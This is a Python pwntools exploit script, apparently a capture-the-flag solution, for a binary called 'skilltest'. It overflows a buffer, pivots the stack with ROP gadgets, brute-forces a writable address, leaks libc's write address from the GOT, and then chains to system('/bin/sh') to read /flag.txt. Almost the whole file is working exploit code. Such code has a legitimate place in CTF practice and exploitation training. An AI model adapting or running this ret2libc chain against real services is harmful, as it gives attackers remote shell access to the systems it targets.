#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
elf = ELF('./skilltest')
rop = ROP(elf)
libc = ELF('./libc-2.34.so')

pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pop_rdi_leave = next(elf.search(asm('pop rdi; nop; leave; ret')))

print_func = 0x4013EF
get_username_func = 0x401422

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			f"b *{hex(get_username_func)}",
			"c",
			# "nextret"
		]), env=env)
	elif args.REMOTE:
		host, port = args.get("HOST", "127.0.0.1"), args.get("PORT", 1337)
		return remote(host, port)
	else:
		return process(elf.path, env=env)

p = get_conn()

OFFSET = 0x28 
# p.sendline(cyclic(200, n=8))


start = 0x0000000000404108 + 0x300 # for testing, bss of the binary
# for addr in range(start, start+1):
for addr in range(0x7fffff719008, 0, -0x100000):
	print(f'Trying {hex(addr)}...')

	p.sendafter(b'Nick: ', 
		b'A' * OFFSET            # padding
		+ p64(addr)              # buf for second read
		+ p64(0xABABABABAB) * 3  # filler

		+ p64(pop_rbp)           # overwrite retaddr, prepare rbp for stack pivot
		+ p64(addr)              # new stack addr
		+ p64(leave_ret)         # mov rsp, rbp; pop rbp and execute first instruction from the ropchain below
	)

	p.sendafter(b"Clan tag: ",
		p64(addr + 0x18)            # consumed by leave instr (pop rbp) from the above leave_ret, point at print func addr on the stack  

		+ p64(pop_rdi_leave)        
		+ p64(elf.got['write'])     # set rdi
		+ p64(addr + 0x38)          # consumed by leave instr (pop rbp), prepare rbp for next pop_rdi_leave, point at get_username func addr on the stack
		+ p64(print_func) # leak, elf.symbols['print']
		
		+ p64(pop_rdi_leave)        
		+ p64(addr + 0x100)         # place for `player_t *player` parameter, first arg of get_username
		+ p64(addr)                 # consumed by leave instr (pop rbp), rbp = addr, reset stack to this addr, stack will be used inside get_username
		
		+ p64(get_username_func)    # elf.symbols['get_username']
	)
	
	output = p.recvline()
	if b'Thanks' in output:
		print("[+] Found writable address: ", hex(addr))
		leak = p.recvuntil(b'Nick: ', drop=True).ljust(8, b'\x00')
		leaked_write = u64(leak)
		print(f"[+] Leaked write {hex(leaked_write)}")
		break

assert leaked_write is not None
libc_base = leaked_write - libc.symbols['write']
print(f'[+] libc base {hex(libc_base)}')
libc.address = libc_base

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols["system"]

# setup rsp, move away from current stack
addr = libc.address + 0x227AA0  # writable addr from libc (.bss), we could probably reuse found writable address but....
print(f"[+] New stack addr: {hex(addr)}")
print(f'Sending final payload...')

libc_rop = ROP(libc)
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
# ofc it is possible to use gadgets from libc
p.send( 
	b'A' * OFFSET            # padding
	+ p64(addr)              # buf for second read
	+ p64(0xABABABABAB) * 3  # filler

	+ p64(pop_rbp)           # overwrite retaddr, prepare rbp for stack pivot
	+ p64(addr)              # new stack addr
	+ p64(leave_ret)         # mov rsp, rbp; pop rbp and execute first instruction from the ropchain below
)

p.sendafter(b"Clan tag: ", 
	p64(0)            # consumed by leave instr (pop rbp) from the above leave_ret, at this point doesn't matter

	+ p64(pop_rdi)        
	+ p64(BINSH)                # command to execute
	+ p64(ret)                  # align stack
	
	+ p64(SYSTEM)
)

p.clean(timeout=1.0)
p.sendline(b'cat /flag.txt')
p.interactive()
